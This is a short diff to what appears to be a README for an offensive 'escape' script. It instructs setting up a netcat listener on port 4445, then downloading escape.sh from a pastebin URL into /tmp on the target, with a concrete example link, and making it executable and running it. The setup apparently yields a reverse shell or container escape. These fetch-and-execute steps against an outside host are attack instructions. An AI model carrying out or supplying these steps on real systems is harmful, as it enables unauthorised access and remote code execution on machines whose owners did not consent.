@@ -158,7 +158,9 @@ To use this script you need to create a new listener (you can create it on the s
 for example: `nc -nlvp 4445` The port before was 4444
 ```bash
 cd /tmp
-wget -O escape.sh -T https://pastebin.com/raw/[your uploaded URL]
+
+wget -O escape.sh https://pastebin.com/raw/[your uploaded URL]
+// for example - wget -O escape.sh https://pastebin.com/raw/YSbnzY2r
 sed -i 's/\r$//' escape.sh
 chmod +x escape.sh
 ./escape.sh
